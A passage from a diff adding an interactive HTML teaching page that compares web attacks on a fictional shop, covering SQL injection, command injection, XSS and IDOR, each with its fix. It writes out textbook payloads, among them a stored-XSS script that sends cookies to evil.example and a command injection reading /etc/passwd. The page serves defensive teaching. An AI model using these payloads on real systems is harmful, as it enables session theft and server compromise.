@@ -1,0 +1,846 @@
+<!doctype html>
+<html lang="en">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Web Attacks Compared</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@12..96,500;12..96,700&family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans:ital,wght@0,400;0,500;0,600;1,400&display=swap">
+<style>
+/* Layout: header with the OWASP edition stamp, grouped view tabs, a sticky rail (comparison presets, steps, controls), then a picker of attacks and the view, with notes on the right.
+   Target colours (t1–t5) encode what the attack hits: the server, other users' browsers, systems behind the server, accounts and access, or the supply chain. */
+:root{
+  --bg:#EEF2F5; --surface:#FFFFFF; --surface-2:#E3E9EE; --ink:#122130; --muted:#55687B; --line:#C6D1DB; --accent:#0B6A8E; --warn:#B4231B; --good:#2E7D32;
+  --t1:#B4231B; --t2:#7445D6; --t3:#BA6608; --t4:#2155D0; --t5:#08826F;
+  --font-display:"Bricolage Grotesque","Avenir Next","Segoe UI",system-ui,sans-serif;
+  --font-body:"IBM Plex Sans","Helvetica Neue",Arial,system-ui,sans-serif;
+  --font-mono:"IBM Plex Mono",ui-monospace,Menlo,Consolas,monospace;
+  --radius:10px;
+}
+@media (prefers-color-scheme: dark){ :root:not([data-theme="light"]){
+  --bg:#0D141B; --surface:#141E28; --surface-2:#1B2733; --ink:#E2EAF1; --muted:#90A3B5; --line:#2A3946; --accent:#5BC0E4; --warn:#FF7A70; --good:#7BD389;
+  --t1:#FF7A70; --t2:#A88AF2; --t3:#F0A447; --t4:#7199FF; --t5:#3BC6AE; color-scheme:dark }}
+:root[data-theme="dark"]{
+  --bg:#0D141B; --surface:#141E28; --surface-2:#1B2733; --ink:#E2EAF1; --muted:#90A3B5; --line:#2A3946; --accent:#5BC0E4; --warn:#FF7A70; --good:#7BD389;
+  --t1:#FF7A70; --t2:#A88AF2; --t3:#F0A447; --t4:#7199FF; --t5:#3BC6AE; color-scheme:dark }
+
+*{box-sizing:border-box}
+[hidden]{display:none!important}
+body{background:var(--bg);color:var(--ink);font-family:var(--font-body);font-size:15px;line-height:1.55;margin:0}
+.wrap{max-width:1480px;margin:0 auto;padding-left:max(16px,env(safe-area-inset-left,0px));padding-right:max(16px,env(safe-area-inset-right,0px))}
+code{font-family:var(--font-mono);font-size:.92em}
+button{font:inherit;color:inherit}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
+
+.top{padding-block:28px 10px}
+.eyebrow{margin:0 0 6px;font-family:var(--font-mono);font-size:12px;letter-spacing:.08em;text-transform:uppercase;color:var(--muted)}
+h1{font-family:var(--font-display);font-weight:700;font-size:clamp(30px,4.4vw,52px);line-height:1.02;margin:0;letter-spacing:-.02em}
+h1 .cur{color:var(--warn)}
+.lede{margin:12px 0 0;color:var(--muted);max-width:74ch}
+.edition{display:inline-flex;flex-wrap:wrap;align-items:center;gap:6px 10px;margin-top:14px;border:1.5px solid var(--ink);border-radius:10px;padding:8px 12px;font-size:13.5px;max-width:100%}
+.edition b{font-family:var(--font-mono);font-size:12.5px;background:var(--ink);color:var(--bg);border-radius:5px;padding:2px 7px}
+.edition span{color:var(--muted)}
+.legend{display:flex;flex-wrap:wrap;gap:6px 14px;margin-top:12px;font-size:13px;color:var(--muted)}
+.legend span{display:inline-flex;align-items:center;gap:6px}
+.legend i{width:12px;height:12px;border-radius:3px;background:var(--c)}
+
+.views{display:flex;gap:8px;flex-wrap:wrap;align-items:flex-start;padding-block:14px 8px}
+.views > .tab{margin-top:17px}
+.tab{display:flex;flex-direction:column;align-items:flex-start;gap:1px;border:1px solid var(--line);background:var(--surface);border-radius:var(--radius);padding:9px 14px;cursor:pointer;text-align:left;min-width:140px;flex:1 1 140px;max-width:250px}
+.tab b{font-family:var(--font-display);font-weight:700;font-size:16px}
+.tab span{font-size:12.5px;color:var(--muted)}
+.tab[aria-selected="true"]{border-color:var(--ink);box-shadow:inset 0 -3px 0 var(--ink)}
+.tab[disabled]{cursor:not-allowed;border-style:dashed;opacity:.65}
+.tab-group{position:relative;display:flex;flex-wrap:wrap;gap:8px;flex:5 1 640px;min-width:0;border:1.5px solid var(--line);border-radius:14px;padding:15.5px 8px 8px}
+.tab-group .tab{flex:1 1 120px}
+.tg-label{position:absolute;top:-9px;left:14px;padding:0 6px;background:var(--bg);font-family:var(--font-mono);font-size:11px;letter-spacing:.08em;text-transform:uppercase;color:var(--muted)}
+.tab-group:has(.tab[aria-selected="true"]){border-color:var(--ink)}
+.tab-group:has(.tab[aria-selected="true"]) .tg-label{color:var(--ink);font-weight:600}
+.viewdesc{color:var(--muted);font-size:14px;margin-block:2px 12px}
+
+.rail{position:sticky;top:env(safe-area-inset-top,0px);z-index:5;background:color-mix(in srgb,var(--bg) 88%,transparent);backdrop-filter:blur(8px);border-block:1px solid var(--line)}
+.rail-in{display:flex;gap:10px 14px;align-items:center;padding-block:10px;flex-wrap:wrap}
+.groups{display:flex;flex-wrap:wrap;gap:4px;padding:3px;border:1px solid var(--line);border-radius:10px;background:var(--surface)}
+.gbtn{border:0;background:none;border-radius:7px;padding:5px 10px;cursor:pointer;font-size:13px;display:flex;flex-direction:column;align-items:flex-start;line-height:1.25}
+.gbtn small{font-family:var(--font-mono);font-size:10px;color:var(--muted)}
+.gbtn.on{background:var(--ink);color:var(--bg)}
+.gbtn.on small{color:var(--bg);opacity:.75}
+.steps{display:flex;gap:5px;flex-wrap:wrap;flex:1 1 320px;min-width:0}
+.sbtn{border:1px solid var(--line);background:var(--surface);border-radius:999px;padding:5px 11px;cursor:pointer;font-size:13px;white-space:nowrap}
+.sbtn i{font-style:normal;font-family:var(--font-mono);color:var(--muted);margin-right:5px}
+.sbtn.on{border-color:var(--accent);background:color-mix(in srgb,var(--accent) 14%,var(--surface));font-weight:600}
+.sbtn.on i{color:var(--accent)}
+.ctrl{display:flex;align-items:center;gap:6px;flex-wrap:wrap}
+.btn{border:1px solid var(--line);background:var(--surface);border-radius:8px;height:36px;min-width:36px;padding:0 12px;cursor:pointer;display:inline-flex;align-items:center;justify-content:center;gap:6px;font-size:14px}
+.btn:hover{border-color:var(--ink)}
+#anim{min-width:150px}
+#anim[aria-pressed="true"]{background:var(--ink);color:var(--bg);border-color:var(--ink)}
+#auto{position:relative;overflow:hidden}
+#auto.on{border-color:var(--ink);font-weight:600}
+.adv-bar{position:absolute;left:0;bottom:0;height:3px;width:0;background:var(--accent)}
+#auto.on .adv-bar{animation:adv var(--adv,12s) linear forwards}
+@keyframes adv{to{width:100%}}
+.anim-paused *:not(.adv-bar){animation-play-state:paused!important}
+.counter{font-family:var(--font-mono);font-size:12.5px;color:var(--muted);min-width:96px;text-align:center;font-variant-numeric:tabular-nums}
+
+.work{display:grid;grid-template-columns:minmax(0,1fr) 400px;gap:20px;padding-block:18px 40px;align-items:start}
+@media (max-width:1100px){.work{grid-template-columns:minmax(0,1fr)}}
+.viz{background:var(--surface);border:1px solid var(--line);border-radius:14px;padding:16px;min-width:0}
+.viz-head{display:flex;flex-wrap:wrap;gap:6px 14px;align-items:baseline;justify-content:space-between;margin-bottom:10px}
+.viz-head h2{font-family:var(--font-display);font-size:19px;margin:0;font-weight:700;text-wrap:balance}
+.viz-head .hint{font-size:13px;color:var(--muted)}
+.scroll-x{overflow-x:auto;-webkit-overflow-scrolling:touch}
+.scroll-x > svg{display:block;min-width:720px;width:100%;height:auto}
+h3.sub{font-family:var(--font-display);font-size:17px;margin:22px 0 4px}
+p.subtext{margin:0 0 10px;color:var(--muted);font-size:14px}
+
+/* attack picker */
+.picker{border:1px dashed var(--line);border-radius:12px;padding:8px 12px 10px;margin-bottom:14px}
+.picker summary{cursor:pointer;font-size:13.5px;font-weight:600}
+.picker summary span{font-weight:400;color:var(--muted)}
+.fam{display:flex;flex-wrap:wrap;gap:5px;align-items:center;margin-top:8px}
+.fam .fl{font-family:var(--font-mono);font-size:10.5px;letter-spacing:.06em;text-transform:uppercase;color:var(--muted);width:150px;flex:none}
+.achip{border:1px solid var(--line);border-left:4px solid var(--c);background:var(--surface);border-radius:7px;padding:4px 9px;cursor:pointer;font-size:13px}
+.achip[aria-pressed="true"]{background:color-mix(in srgb,var(--c) 16%,var(--surface));border-color:var(--c);font-weight:600}
+.achip small{font-family:var(--font-mono);font-size:10px;color:var(--muted);margin-left:5px}
+
+/* svg */
+.frame{fill:none;stroke:var(--line);stroke-dasharray:4 4}
+.frame-lbl{fill:var(--muted);font-family:var(--font-mono);font-size:11px;letter-spacing:.08em;text-transform:uppercase}
+.link{stroke:var(--line);stroke-width:2;fill:none}
+.link.hot{stroke:var(--c);stroke-width:3}
+.link-lbl{fill:var(--muted);font-family:var(--font-mono);font-size:10.5px}
+.node rect{fill:var(--surface);stroke:var(--line);stroke-width:1.5}
+.node .t{fill:var(--ink);font-weight:600;font-size:13.5px;font-family:var(--font-body)}
+.node .s{fill:var(--muted);font-size:10.5px;font-family:var(--font-mono)}
+.node.dim{opacity:.45}
+.node.on rect{stroke:var(--c);stroke-width:2.5;fill:color-mix(in srgb,var(--c) 10%,var(--surface))}
+.node.evil rect{stroke-dasharray:5 3}
+.trail{fill:none;stroke:var(--c);stroke-width:3;stroke-linecap:round;opacity:.22}
+.trail.act{opacity:1}
+.pkt{fill:var(--c);stroke:var(--surface);stroke-width:2}
+.pill rect{fill:var(--ink)}
+.pill text{fill:var(--bg);font-family:var(--font-mono);font-size:11px}
+.lane-h{fill:var(--ink);font-weight:600;font-size:12.5px;font-family:var(--font-body)}
+.lane-s{fill:var(--muted);font-size:10px;font-family:var(--font-mono)}
+.lifeline{stroke:var(--line);stroke-dasharray:3 4}
+.arrow{stroke:var(--c);stroke-width:1.8}
+.arrowhead{fill:var(--c)}
+.alabel{fill:var(--ink);font-family:var(--font-mono);font-size:10.5px;paint-order:stroke;stroke:var(--surface);stroke-width:4px;stroke-linejoin:round}
+.snote rect{fill:color-mix(in srgb,var(--c) 14%,var(--surface));stroke:var(--c)}
+.snote text{fill:var(--ink);font-family:var(--font-mono);font-size:10.5px}
+.log{list-style:none;margin:12px 0 0;padding:0;display:grid;gap:4px}
+.log li{display:grid;grid-template-columns:28px minmax(0,1fr);gap:8px;align-items:baseline;padding:5px 8px;border-radius:6px;font-size:13.5px}
+.log li .n{font-family:var(--font-mono);font-size:11px;color:var(--muted)}
+.log li .who{font-family:var(--font-mono);font-size:12px;color:var(--muted)}
+.log li.act{background:color-mix(in srgb,var(--c) 12%,transparent)}
+
+/* high level */
+.targets{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:8px}
+.tcard{text-align:left;border:1px solid var(--line);border-top:4px solid var(--c);background:var(--surface);border-radius:10px;padding:10px 12px;cursor:pointer;line-height:1.4}
+.tcard.on{box-shadow:inset 0 0 0 1.5px var(--c);background:color-mix(in srgb,var(--c) 7%,var(--surface))}
+.tcard b{font-family:var(--font-display);font-size:15.5px;display:block}
+.tcard span{font-size:13px;color:var(--muted)}
+.alist{display:flex;flex-wrap:wrap;gap:6px;margin-top:6px}
+
+/* side by side */
+.pgrid{display:grid;grid-template-columns:repeat(auto-fit,minmax(360px,1fr));gap:12px}
+.pcard{border:1px solid var(--line);border-top:4px solid var(--c);border-radius:12px;padding:10px 12px 12px;min-width:0;display:flex;flex-direction:column}
+.pc-head{display:flex;align-items:baseline;gap:8px;flex-wrap:wrap;margin-bottom:4px}
+.pc-head b{font-family:var(--font-display);font-size:17px}
+.tag{font-family:var(--font-mono);font-size:10.5px;color:var(--c);border:1px solid var(--c);border-radius:999px;padding:0 7px}
+.pc-svg{overflow-x:auto}
+.pc-svg svg{display:block;width:100%;height:auto}
+.pc-text{font-size:13.5px;margin:8px 0 0}
+
+/* request anatomy */
+.req{font-family:var(--font-mono);font-size:13px;background:var(--surface-2);border:1px solid var(--line);border-radius:10px;padding:12px 14px;overflow-x:auto;line-height:1.9}
+.req .ln{white-space:pre}
+.seg{border:0;background:none;padding:1px 3px;border-radius:4px;cursor:pointer;font:inherit;white-space:pre}
+.seg.p{background:color-mix(in srgb,var(--warn) 18%,transparent);color:var(--ink);box-shadow:inset 0 -2px 0 var(--warn)}
+.seg.k{background:color-mix(in srgb,var(--accent) 16%,transparent);box-shadow:inset 0 -2px 0 var(--accent)}
+.seg.on{outline:2px solid var(--ink);outline-offset:1px}
+.rlegend{display:flex;flex-wrap:wrap;gap:6px 16px;font-size:12.5px;color:var(--muted);margin:0 0 8px}
+.rlegend i{display:inline-block;width:18px;height:10px;border-radius:3px;margin-right:6px;vertical-align:-1px}
+.rdetail{margin-top:14px;border-left:3px solid var(--c);background:color-mix(in srgb,var(--c) 7%,transparent);padding:10px 12px;border-radius:0 8px 8px 0;min-height:5.5em}
+.rdetail code{font-weight:600;word-break:break-all}
+.rdetail p{margin:6px 0 0}
+
+/* vulnerable vs fixed */
+.fixcard{border:1px solid var(--line);border-left:5px solid var(--c);border-radius:12px;padding:12px;margin-bottom:12px}
+.fixcard h3{margin:0 0 8px;font-family:var(--font-display);font-size:17px}
+.fixcols{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:10px}
+@media (max-width:820px){.fixcols{grid-template-columns:minmax(0,1fr)}}
+.code{font-family:var(--font-mono);font-size:12.5px;background:var(--surface-2);border-radius:8px;padding:8px 0;overflow-x:auto;border-top:3px solid var(--k)}
+.code .h{font-family:var(--font-mono);font-size:11px;letter-spacing:.06em;text-transform:uppercase;color:var(--k);padding:0 12px 4px;font-weight:600}
+.code div.l{white-space:pre;padding:1px 12px}
+.code div.l.bad{background:color-mix(in srgb,var(--warn) 16%,transparent);box-shadow:inset 3px 0 0 var(--warn)}
+.code div.l.good{background:color-mix(in srgb,var(--good) 16%,transparent);box-shadow:inset 3px 0 0 var(--good)}
+.fixnote{font-size:13.5px;margin:8px 0 0}
+
+/* compare */
+.ctable{border-collapse:separate;border-spacing:0;width:100%;min-width:720px;font-size:13.5px}
+.ctable th,.ctable td{padding:9px 10px;border-bottom:1px solid var(--line);text-align:left;vertical-align:top}
+.ctable thead th{position:sticky;top:0;background:var(--surface);font-family:var(--font-display);font-size:16px;border-bottom:3px solid var(--c)}
+.ctable thead th small{display:block;font-family:var(--font-mono);font-size:10.5px;color:var(--c);font-weight:500}
+.ctable tbody th{font-weight:600;color:var(--muted);width:170px;font-size:12px;font-family:var(--font-mono);text-transform:uppercase;letter-spacing:.04em}
+
+/* notes */
+.notes{background:var(--surface);border:1px solid var(--line);border-radius:14px;padding:18px 20px;min-width:0;position:sticky;top:calc(env(safe-area-inset-top,0px) + 76px);max-height:calc(100vh - 96px);overflow:auto}
+@media (max-width:1100px){.notes{position:static;max-height:none}}
+.notes .kicker{font-family:var(--font-mono);font-size:12px;color:var(--c);letter-spacing:.05em;text-transform:uppercase;margin:0}
+.notes h2{font-family:var(--font-display);font-size:25px;line-height:1.12;margin:4px 0 8px;text-wrap:balance}
+.notes .sum{font-size:16px;margin:0 0 12px}
+.notes p{margin:0 0 10px}
+.notes h3{font-size:12px;font-family:var(--font-mono);letter-spacing:.07em;text-transform:uppercase;color:var(--muted);margin:14px 0 6px;font-weight:500}
+.notes ul{margin:0 0 10px;padding-left:18px}
+.notes li{margin-bottom:6px}
+.say{border-left:3px solid var(--c);background:color-mix(in srgb,var(--c) 8%,transparent);padding:10px 12px;border-radius:0 8px 8px 0;margin:14px 0}
+.say h3{margin-top:0}
+.say p{margin:0;font-size:15px}
+.facts{display:flex;flex-wrap:wrap;gap:5px;margin:4px 0 14px}
+.chip{font-family:var(--font-mono);font-size:11.5px;border:1px solid var(--line);border-radius:999px;padding:2px 9px;background:var(--surface-2)}
+
+footer{color:var(--muted);font-size:12.5px;padding-block:0 32px}
+footer p{max-width:92ch;margin:0 0 6px}
+@media (max-width:720px){.tab{max-width:none}.pgrid{grid-template-columns:minmax(0,1fr)}.fam .fl{width:100%}}
+@media (prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important}}
+</style>
+
+<header class="top wrap">
+  <a class="home-link" href="../" hidden style="display:inline-block;margin-bottom:10px;font-family:var(--font-mono);font-size:12.5px;color:var(--accent);text-decoration:none">&larr; All topics</a>
+  <p class="eyebrow">Web attacks and vulnerabilities, side by side</p>
+  <h1>Web Attacks Compared<span class="cur">_</span></h1>
+  <p class="lede">Fourteen classic web attacks on a fictional shop, from SQL injection to supply-chain compromise. Pick the ones you want to compare and see them side by side: the flaw, how it's found, the exploit, where the code runs, the damage, and the fix.</p>
+  <div class="edition"><b>OWASP Top 10:2025</b><span>Category numbers follow the 2025 edition (published November 2025), with the 2021 edition alongside. Content checked November 2026. OWASP revises the list every few years, so a newer edition may renumber these; see owasp.org/Top10.</span></div>
+  <div class="legend" aria-label="Colour key: what the attack hits">
+    <span style="--c:var(--t1)"><i></i>The server and its data</span><span style="--c:var(--t2)"><i></i>Other users' browsers</span><span style="--c:var(--t3)"><i></i>Systems behind the server</span><span style="--c:var(--t4)"><i></i>Accounts and access</span><span style="--c:var(--t5)"><i></i>Build and supply chain</span>
+  </div>
+</header>
+
+<nav class="views wrap" role="tablist" aria-label="Visualisation" id="tabs"></nav>
+<p class="viewdesc wrap" id="viewdesc"></p>
+
+<div class="rail">
+  <div class="wrap rail-in">
+    <div class="groups" id="groups" role="group" aria-label="Comparison presets"></div>
+    <div class="steps" id="steps"></div>
+    <div class="ctrl">
+      <button class="btn" id="prev" type="button" aria-label="Previous" title="Previous (←)">&#8592;</button>
+      <button class="btn" id="anim" type="button" aria-pressed="false" title="Pause the animations (space)">Pause animation</button>
+      <button class="btn" id="next" type="button" aria-label="Next" title="Next (→)">&#8594;</button>
+      <span class="counter" id="counter"></span>
+      <button class="btn" id="auto" type="button" aria-pressed="false" title="Move on automatically, looping">Auto-advance<span class="adv-bar"></span></button>
+    </div>
+  </div>
+</div>
+
+<main class="wrap work">
+  <section class="viz" id="viz" aria-live="polite"></section>
+  <aside class="notes" id="notes"></aside>
+</main>
+
+<footer class="wrap">
+  <p>OWASP Top 10 categories: 2025 edition (published November 2025), with 2021 numbers for comparison. If you're reading this after a newer edition, the numbers may have moved but the attacks work the same way.</p>
+  <p>For learning and defence. Examples target a fictional shop (shop.example, evil.example) and use classic textbook payloads, always shown with detection and the fix. Only test systems you own or are authorised to test.</p>
+</footer>
+
+<script>
+/* ============================================================
+   DATA MODEL
+   TARGETS: what an attack hits (sets the colour).
+   PHASES: the six-phase spine every attack is described in.
+   A: the attacks. Each has actors (lanes), ph[phase] = {s, t} (sequence rows [from,to,label] or [lane,"=",note], text),
+   req (request lines: strings, or [text, "p"(payload)|"k"(context), explanation]), path (messages on the shop map),
+   code {lang, v, f, hv, hf} (vulnerable/fixed lines + highlighted line numbers), cmp (compare-table values).
+   PRESETS: ready-made comparisons. OWASP numbers: Top 10:2025 (o25) and 2021 (o21).
+   ============================================================ */
+const TARGETS=[
+ {id:"server",name:"The server and its data",color:"var(--t1)",
+  line:`Attacks that make the server run, read or reveal something it shouldn't.`,
+  text:[`The web server and its database hold everything: customers, orders, passwords, secrets. These attacks send input the server misinterprets as instructions, or exploit what was left open.`],
+  analogy:`Talking a bank clerk into opening the vault by phrasing your request cleverly.`,remember:`Whatever runs on the server runs with the server's power.`},
+ {id:"browser",name:"Other users' browsers",color:"var(--t2)",
+  line:`Attacks that use the site to reach its visitors.`,
+  text:[`Here the target isn't the server but the people using it. The attacker makes the site deliver something harmful to visitors, or makes their browsers send requests they never meant to send.`],
+  analogy:`Using a trusted noticeboard to pin up a fake notice that everyone believes.`,remember:`The site's good name is what makes these attacks work.`},
+ {id:"internal",name:"Systems behind the server",color:"var(--t3)",
+  line:`Attacks that use the server as a stepping stone into the private network.`,
+  text:[`A web server sits inside a network that the internet can't reach directly: internal APIs, admin panels, cloud metadata. Trick the server into making requests for you, and you're inside.`],
+  analogy:`Asking the receptionist to fetch something from an office you're not allowed into.`,remember:`The server's network position is a privilege attackers want to borrow.`},
+ {id:"access",name:"Accounts and access",color:"var(--t4)",
+  line:`Attacks that get at other people's accounts or data without breaking anything.`,
+  text:[`No code is injected here. The attacker uses the site exactly as designed, just with someone else's password, or by asking for things that belong to someone else when the site forgets to check.`],
+  analogy:`A hotel where any key card opens any room, if you just type a different number.`,remember:`"Logged in" is not the same as "allowed".`},
+ {id:"supply",name:"Build and supply chain",color:"var(--t5)",
+  line:`Attacks on the code the app is built from, before it ever runs.`,
+  text:[`Modern apps are mostly other people's code: hundreds of libraries pulled in by the build. Compromise one of them and the victim deploys the attack themselves.`],
+  analogy:`Poisoning the flour supplier instead of breaking into the bakery.`,remember:`Every dependency is code you chose to trust.`}
+];
+const TI=Object.fromEntries(TARGETS.map((t,i)=>[t.id,i]));
+const PHASES=[
+ {id:"flaw",name:"The flaw",q:"What's wrong, and where does it live?",text:`Every attack starts with a weakness: code that trusts input, a missing check, an unsafe setting, or a dependency nobody verified.`,ck:"root"},
+ {id:"discover",name:"Discovery",q:"How does an attacker find it?",text:`Attackers probe with small, telling inputs and watch how the application reacts. Automated scanners do this at enormous scale.`,ck:null},
+ {id:"exploit",name:"The exploit",q:"What does the actual attack look like?",text:`The malicious request or package itself: the part that turns a weakness into an attack.`,ck:null},
+ {id:"executes",name:"What runs where",q:"Whose code runs, and on which machine?",text:`The most useful question when comparing attacks: does the attacker's input run on the server, in a victim's browser, inside the internal network, or nowhere at all?`,ck:"runs"},
+ {id:"impact",name:"Impact",q:"What does the attacker get?",text:`From one user's data to the whole server, the cloud account or every customer.`,ck:"impact"},
+ {id:"defend",name:"Detect and fix",q:"How do you spot it and fix it properly?",text:`A real fix removes the root cause; detection and defence in depth catch what slips through.`,ck:"fix"}
+];
+const L={att:["att","Attacker",""],app:["app","Web app","shop.example"],db:["db","Database",""],os:["os","Server OS","shell, files"],fs:["fs","File system","/var/www, /etc"],vic:["vic","Victim's browser","logged in to shop"]};
+
+const A={
+sqli:{name:"SQL injection",short:"SQLi",target:"server",fam:"Injection",o25:"A05:2025 Injection",o21:"A03:2021 Injection",cwe:"CWE-89",
+ plain:`Typed text gets treated as part of a database command.`,analogy:`A form field read aloud as an instruction: "My name is Bob, and also give me everyone's records."`,
+ actors:[L.att,L.app,L.db],
+ ph:{flaw:{s:[["app","=","\"…WHERE email='\" + input + \"'\""]],t:`The app builds an SQL query by gluing user input into the command text, so the input can change the command's structure.`},
+  discover:{s:[["att","app","email = test'"],["app","att","500 error: SQL syntax"]],t:`A single quote that breaks the query, or answers that change between ' AND 1=1 and ' AND 1=2, give it away. Tools like sqlmap automate this.`},
+  exploit:{s:[["att","app","email = ' OR 1=1--"],["app","db","WHERE email='' OR 1=1--'"],["db","app","every row matches"]],t:`The quote closes the string, OR 1=1 makes the condition always true, and -- comments out the rest. UNION SELECT can pull data from other tables.`},
+  executes:{s:[["db","=","database runs attacker-shaped SQL"]],t:`Runs on the server, inside the database engine, with the app's database privileges.`},
+  impact:{s:[["db","att","users, orders, password hashes"],["att","=","maybe change or delete data"]],t:`Reading or changing any data the app's database account can reach; sometimes file access or command execution through database features.`},
+  defend:{s:[["app","=","parameterised: WHERE email = ?"],["app","=","least-privilege DB account"]],t:`Fix: parameterised queries (prepared statements), so input is always treated as data. Detect: database errors in logs, firewall rules for SQL patterns, unusual query volumes.`}},
+ req:[["POST /login HTTP/1.1"],["Host: shop.example"],["Content-Type: application/x-www-form-urlencoded"],[""],["email=",["' OR 1=1--","p","Closes the email string, adds a condition that's always true, and comments out the password check that followed."],"&password=x"]],
+ path:[["att","app","login: ' OR 1=1--"],["app","db","query logic changed"],["db","app","all user rows"],["app","att","logged in as the first user"]],
+ code:{lang:"Python",v:[`email = request.form["email"]`,`sql = "SELECT * FROM users WHERE email = '" + email + "'"`,`user = db.execute(sql).fetchone()`],f:[`email = request.form["email"]`,`sql = "SELECT * FROM users WHERE email = %s"`,`user = db.execute(sql, (email,)).fetchone()`],hv:[1],hf:[1,2],note:`The placeholder sends the query and the value separately, so the database never parses the value as SQL.`},
+ cmp:{root:"Input concatenated into an SQL command",runs:"In the database server",impact:"Data theft or tampering; sometimes full takeover",detect:"SQL errors, firewall signatures, unusual queries",fix:"Parameterised queries, ORM, least privilege",attck:"T1190 → T1005 data from local system, T1552 credentials"}},
+cmdi:{name:"OS command injection",short:"Command injection",target:"server",fam:"Injection",o25:"A05:2025 Injection",o21:"A03:2021 Injection",cwe:"CWE-78",
+ plain:`Typed text gets run as a command on the server.`,analogy:`Asking a receptionist to "call 555-0100; and also unlock the back door", and they do both.`,
+ actors:[L.att,L.app,L.os],
+ ph:{flaw:{s:[["app","=","os.system(\"ping -c 1 \" + host)"]],t:`The app hands user input to a shell to run a system tool, such as ping or an image converter.`},
+  discover:{s:[["att","app","host = 127.0.0.1; sleep 10"],["app","att","answer arrives 10 s late"]],t:`Shell characters (; | && $( )) and timing tests reveal it, even when no output is shown.`},
+  exploit:{s:[["att","app","host = 8.8.8.8; cat /etc/passwd"],["app","os","sh -c \"ping …; cat /etc/passwd\""],["os","app","output of both"]],t:`The shell sees two commands separated by a semicolon. The attacker can run anything the web server's user can.`},
+  executes:{s:[["os","=","attacker's command runs as the app's OS user"]],t:`Runs on the server's operating system: the worst place for injected code.`},
+  impact:{s:[["att","os","download tools, open a remote shell"],["os","=","move on to other systems"]],t:`Usually full control of the server and a foothold in the network.`},
+  defend:{s:[["app","=","run([\"ping\",\"-c\",\"1\",host])"],["app","=","validate: host must be an IP"]],t:`Fix: avoid the shell, pass arguments as a list, validate strictly, or use a library instead of a command. Detect: web server processes starting shells, unexpected outbound connections.`}},
+ req:[["POST /tools/ping HTTP/1.1"],["Host: shop.example"],[""],["host=8.8.8.8",["; cat /etc/passwd","p","The semicolon ends the ping command; the shell then runs the attacker's command as well."]]],
+ path:[["att","app","host=8.8.8.8; cat /etc/passwd"],["app","os","shell runs both commands"],["os","app","command output"],["app","att","file contents returned"]],
+ code:{lang:"Python",v:[`host = request.form["host"]`,`os.system("ping -c 1 " + host)`],f:[`host = request.form["host"]`,`ipaddress.ip_address(host)  # raises if not an IP`,`subprocess.run(["ping", "-c", "1", host], check=True)`],hv:[1],hf:[1,2],note:`Without a shell there is nothing to interpret the semicolon, and validation rejects anything that isn't an IP address.`},
+ cmp:{root:"Input passed to a shell",runs:"On the server's operating system",impact:"Full server compromise",detect:"Shells started by the web server, outbound connections",fix:"No shell, argument lists, strict validation",attck:"T1190 → T1059 command interpreter, T1505.003 web shell"}},
+xss:{name:"Cross-site scripting",short:"XSS",target:"browser",fam:"Injection",o25:"A05:2025 Injection",o21:"A03:2021 Injection",cwe:"CWE-79",
+ plain:`The attacker's script runs in other users' browsers, as if the site sent it.`,analogy:`A note pinned to a shared noticeboard that hypnotises whoever reads it.`,
+ actors:[L.att,L.app,L.vic],
+ ph:{flaw:{s:[["app","=","page += \"<p>\" + comment + \"</p>\""]],t:`The app puts user-supplied text into a page as HTML without escaping it, so the browser treats it as markup and code.`},
+  discover:{s:[["att","app","comment = <b>hi</b>"],["app","att","shown in bold → not escaped"]],t:`If harmless HTML renders, scripts probably will too. Reflected XSS hides in search pages and error messages; DOM XSS in front-end code that writes to innerHTML.`},
+  exploit:{s:[["att","app","comment = <script>…<\/script>"],["vic","app","open the product page"],["app","vic","page includes the script"]],t:`Stored XSS saves the payload for every visitor; reflected XSS hides it in a link the victim clicks.`},
+  executes:{s:[["vic","=","script runs as part of shop.example"]],t:`Runs in the victim's browser, with full access to that page and the user's session on that site.`},
+  impact:{s:[["vic","att","session cookie, page data"],["vic","app","actions as the victim"]],t:`Account takeover, data theft, fake login forms, actions on the user's behalf.`},
+  defend:{s:[["app","=","escape output: &lt;script&gt;"],["app","=","CSP · HttpOnly cookies"]],t:`Fix: output encoding for the context (templates do it by default), avoid innerHTML, sanitise rich text. Defence in depth: Content Security Policy and HttpOnly cookies.`}},
+ req:[["POST /products/42/comments HTTP/1.1"],["Host: shop.example"],["Cookie: session=",["attacker-session","k","The attacker's own account: posting a comment is allowed."]],[""],["text=Great!",["<script>fetch('//evil.example/?c='+document.cookie)<\/script>","p","Saved as a comment, then sent to every visitor's browser as part of the page, where it runs and sends their cookies to the attacker."]]],
+ path:[["att","app","comment with <script>"],["app","db","stored"],["vic","app","view product page"],["app","vic","page + attacker's script"],["vic","att","victim's cookie sent out"]],
+ code:{lang:"JavaScript",v:[`const c = await getComment(id);`,`el.innerHTML = c.text;`],f:[`const c = await getComment(id);`,`el.textContent = c.text;  // shown as text, never run`],hv:[1],hf:[1],note:`textContent never parses HTML. Server-side templates should escape by default; add a Content Security Policy as a second line.`},
+ cmp:{root:"Untrusted text inserted into HTML or script",runs:"In the victim's browser",impact:"Session theft, account takeover",detect:"CSP violation reports, firewall, scanning stored content",fix:"Output encoding, safe DOM APIs, CSP",attck:"T1189 drive-by compromise, T1539 steal web session cookie"}},
+idor:{name:"Insecure direct object reference",short:"IDOR",target:"access",fam:"Access & identity",o25:"A01:2025 Broken Access Control",o21:"A01:2021 Broken Access Control",cwe:"CWE-639",
+ plain:`Changing a number in the address shows someone else's data.`,analogy:`Hotel key cards that open any room if you just type a different room number.`,
+ actors:[L.att,L.app,L.db],
+ ph:{flaw:{s:[["app","=","GET /orders/:id → load by id"],["app","=","(never checks it's yours)"]],t:`The app checks that you're logged in, but not that the object you ask for belongs to you.`},
+  discover:{s:[["att","app","GET /orders/1001 (mine)"],["att","app","GET /orders/1002"],["app","att","200 OK: someone else's order"]],t:`IDs in URLs, JSON bodies or hidden fields are simply tried with other values.`},
